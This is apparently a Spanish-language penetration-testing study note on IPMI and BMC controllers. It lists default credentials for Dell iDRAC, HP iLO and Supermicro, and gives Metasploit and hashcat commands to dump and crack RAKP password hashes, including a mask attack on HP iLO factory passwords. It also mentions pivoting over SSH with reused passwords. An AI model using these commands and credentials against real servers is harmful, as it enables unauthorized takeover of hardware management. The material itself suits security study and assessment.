# IPMI

*Intelligent Platform Management Interface*

Conjunto de especificaciones para gestión y monitorización de hosts a nivel de **hardware**. Funciona de forma autónoma, independiente de la BIOS, CPU, firmware y SO. Permite al admin gestionar/monitorizar un sistema incluso **apagado o colgado**, vía red directa al hardware (no necesita login en el SO). Sirve para modificar la BIOS antes del arranque, acceder con el host apagado o tras un fallo, y monitorizar temperatura, voltaje, ventiladores, logs, etc.

Puerto **623 UDP** → IPMI (protocolo asf-rmcp)

## BMC

Los sistemas con IPMI se llaman **BMC** (Baseboard Management Controller): un microcontrolador embebido (normalmente ARM con Linux) conectado a la placa base. Suele exponer consola web, acceso remoto (SSH/Telnet) y el puerto 623 UDP.

Acceder a un BMC ≈ **acceso físico al sistema**: permite monitorizar, reiniciar, apagar o reinstalar el SO. BMCs comunes: **HP iLO**, **Dell iDRAC**, **Supermicro IPMI**.

## Footprinting

* Escaneo de versión con Nmap
```bash
sudo nmap -sU --script ipmi-version -p623 target
```

* Con Metasploit
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
set rhosts target
run
```

## Credenciales por defecto

| Producto | Usuario | Contraseña |
|----------|---------|------------|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | cadena aleatoria de 8 caracteres (mayúsculas + números) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

## Configuración peligrosa: fallo RAKP (IPMI 2.0)

Fallo en el protocolo **RAKP** de IPMI 2.0: durante la autenticación, el servidor envía un hash SHA1/MD5 con sal de la contraseña del usuario **antes** de autenticar. Esto permite obtener el hash de **cualquier cuenta válida** del BMC y crackearlo offline. No tiene arreglo directo (es parte de la especificación); mitigación: contraseñas muy largas o segmentación de red.

* Volcar hashes con Metasploit (crackea automáticamente las comunes)
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts target
run
```

* Crackear el hash offline con Hashcat (modo **7300**)
```bash
hashcat -m 7300 ipmi.txt /ruta/wordlist.txt
```

* Mask attack para contraseña de fábrica de HP iLO (8 caracteres, mayúsculas + dígitos)
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Nota: un hash crackeado puede dar acceso a la consola web del BMC (hallazgo de alto riesgo) y, si la contraseña se reutiliza, pivotar por SSH a otros servidores críticos como root.
